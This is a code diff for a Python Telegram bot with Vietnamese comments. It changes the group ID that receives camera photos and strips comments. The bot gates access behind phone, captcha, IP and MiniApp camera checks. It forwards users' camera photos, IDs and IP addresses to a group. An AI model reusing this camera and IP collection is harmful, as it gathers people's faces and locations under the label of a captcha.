@@ -51,7 +51,7 @@ ADMIN_IDS = [5633649201, 7884394252]
 TIMEZONE = pytz.timezone("Asia/Ho_Chi_Minh")
 
 # Nhóm nhận ảnh chụp camera từ miniapp (bot PHẢI là admin/thành viên của nhóm này)
-CAMERA_TARGET_GROUP = "@camerapromax"
+CAMERA_TARGET_GROUP = "-1003965127155"
 
 # True  = bắt buộc MiniApp phải gửi kèm ảnh chụp hợp lệ mới tính là xác minh camera thành công
 # False = không có ảnh vẫn cho qua (như code cũ)
@@ -341,7 +341,6 @@ pending_miniapp_captcha = {}
 pending_camera_verified = set()
 admin_input_states = {}
 
-# Chống spam thông báo lỗi gửi ảnh camera cho admin
 _last_cam_alert_ts = 0.0
 
 logging.basicConfig(
@@ -570,7 +569,6 @@ async def is_maintenance():
 
 
 async def reset_camera_verification():
-    """Bắt TOÀN BỘ thành viên phải làm lại xác minh Captcha MiniApp + Camera + CCCAM."""
     await db_query(
         "UPDATE users SET miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0",
         commit=True,
@@ -1282,19 +1280,16 @@ async def proceed_next_verification(
 ):
     user_id = user.id
 
-    # Bước 1: Số điện thoại
     if await get_verify_setting("verify_phone"):
         if not await check_phone_verified(user_id) and user_id not in ADMIN_IDS:
             await prompt_phone_verification(update_or_msg, user_id)
             return
 
-    # Bước 2: Xác minh CCCAM (Captcha & Camera) - chỉ cần cờ cccam_verified
     if await get_verify_setting("verify_cccam"):
         if not await check_cccam_verified(user_id) and user_id not in ADMIN_IDS:
             await prompt_miniapp_captcha_verification(update_or_msg, user_id)
             return
 
-    # Bước 3 & 4 Gộp lại: Captcha MiniApp & Camera (nếu bật riêng lẻ)
     if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting(
         "verify_camera"
     ):
@@ -1305,13 +1300,11 @@ async def proceed_next_verification(
             await prompt_miniapp_captcha_verification(update_or_msg, user_id)
             return
 
-    # Bước 5: IP MiniApp
     if await get_verify_setting("verify_ip"):
         if not await check_ip_verified(user_id) and user_id not in ADMIN_IDS:
             await prompt_ip_verification(update_or_msg, user_id)
             return
 
-    # Bước 6: Captcha phép tính
     if await get_verify_setting("verify_captcha"):
         if not await check_captcha_verified(user_id) and user_id not in ADMIN_IDS:
             if user_id in pending_captcha_users:
@@ -1319,7 +1312,6 @@ async def proceed_next_verification(
             await send_captcha_challenge(update_or_msg, context, user_id)
             return
 
-    # Bước 7: Kênh/nhóm
     if await get_verify_setting("verify_channel"):
         if user_id not in ADMIN_IDS:
             missing_channels = await get_missing_channels(context.bot, user_id)
@@ -1550,7 +1542,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # XỬ LÝ ẢNH CAMERA TỪ MINIAPP
 # ============================================================
 def _extract_photo_bytes(data: dict):
-    """Lấy ảnh từ payload MiniApp (hỗ trợ nhiều tên trường và định dạng base64 khác nhau). Trả về bytes JPEG hợp lệ hoặc None."""
     raw = ""
     for key in (
         "image",
@@ -1602,7 +1593,6 @@ def _extract_photo_bytes(data: dict):
 async def send_camera_photo(
     context: ContextTypes.DEFAULT_TYPE, user, ip, img_bytes: bytes
 ) -> bool:
-    """Gửi ảnh camera về nhóm. Thử send_photo, lỗi thì thử send_document, vẫn lỗi thì báo admin."""
     global _last_cam_alert_ts
     user_info_str = (
         f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
@@ -1702,7 +1692,6 @@ async def handle_miniapp_captcha_data(
 
     pending_miniapp_captcha.pop(uid, None)
 
-    # Đánh dấu hoàn thành Captcha MiniApp, Camera và CCCAM cùng lúc
     await db_query(
         "UPDATE users SET miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
         (uid,),
@@ -1732,7 +1721,6 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
 
         dtype = data.get("type")
 
-        # (1) User TỪ CHỐI quyền camera - phải kiểm tra TRƯỚC
         if dtype == "camera_denied":
             await db_query(
                 "UPDATE users SET captcha_verified=0, miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0 WHERE user_id=%s",
@@ -1765,7 +1753,6 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             or img_bytes is not None
         )
 
-        # (2) Xác minh Captcha MiniApp / Camera / CCCAM
         if is_verify_payload:
             camera_needed = (
                 CAMERA_REQUIRE_PHOTO
@@ -1796,7 +1783,6 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             )
             return
 
-        # (3) Xác minh IP bình thường (nếu có kèm ảnh thì vẫn gửi về nhóm)
         if img_bytes:
             await send_camera_photo(context, user, data.get("ip"), img_bytes)
 
@@ -2650,7 +2636,6 @@ async def admin_toggle_callback(
         )
         return
 
-    # Nút "Captcha & Camera MiniApp": bật/tắt ĐỒNG THỜI cả 2 cờ
     if data == "toggle_verify_miniapp_captcha":
         cur_cap = await get_verify_setting("verify_miniapp_captcha")
         cur_cam = await get_verify_setting("verify_camera")
@@ -2689,7 +2674,6 @@ async def admin_toggle_callback(
         new_val = not curr_val
         await set_verify_setting(setting_key, new_val)
 
-        # Bật CCCAM => TOÀN BỘ thành viên phải làm lại captcha + camera
         if data == "toggle_verify_cccam" and new_val:
             await reset_camera_verification()
             status_text = (
